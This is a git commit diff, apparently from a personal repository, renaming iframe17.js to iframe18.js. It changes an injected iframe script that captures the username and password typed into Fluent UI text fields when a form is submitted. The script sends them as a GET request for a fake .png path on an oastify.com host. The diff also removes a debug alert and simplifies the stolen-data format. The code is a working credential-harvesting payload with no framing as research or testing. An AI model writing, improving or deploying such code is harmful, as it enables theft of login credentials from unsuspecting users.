c91ea00a496bdcc72ca8113df4c958c83256c2de
MR0Boss <36040218+MR0Boss@users.noreply.github.com>
2025-01-15 18:50:59 -0500

    Update and rename iframe17.js to iframe18.js

--- iframe18.js
+++ iframe18.js
@@ -16,32 +16,16 @@
         // Inject script to listen to form submission inside the iframe
         var script = doc.createElement('script');
         script.textContent = `
-            function objectToUrlEncodedString(data) {
-                return Object.keys(data).map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key])).join('&');
-            }
             function sendData(username, password) {
                 var xhr = new XMLHttpRequest();
-                xhr.open('GET', 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com/USER' + encodeURIComponent(username) + 'PASS' + encodeURIComponent(password) + '.png', true);
+                xhr.open('GET', 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com/' + encodeURIComponent(username) + ':' + encodeURIComponent(password) + '.png', true);
                 xhr.send();
             }
 
             document.body.addEventListener('submit', function(event) {
                 if (event.target.tagName.toLowerCase() === 'form') {
-                var formData = {};
-
-                    // Iterate over all input elements in the form
-                    var inputs = event.target.querySelectorAll('fluent-text-field');
-                    inputs.forEach(function(input) {
-                        // Assuming you want to ignore buttons and submit inputs
-                        if (input.type !== 'submit' && input.type !== 'button') {
-                            formData[input.name] = input.value; // Use the name attribute as the key
-                        }
-                    });
-                    var urlEncodedString = objectToUrlEncodedString(formData);
-                    
                     var username = document.getElementsByTagName('fluent-text-field')[0].value;
                     var password = document.getElementsByTagName('fluent-text-field')[1].value;
-                    alert(urlEncodedString);
                     sendData(username, password);
                 }
             });
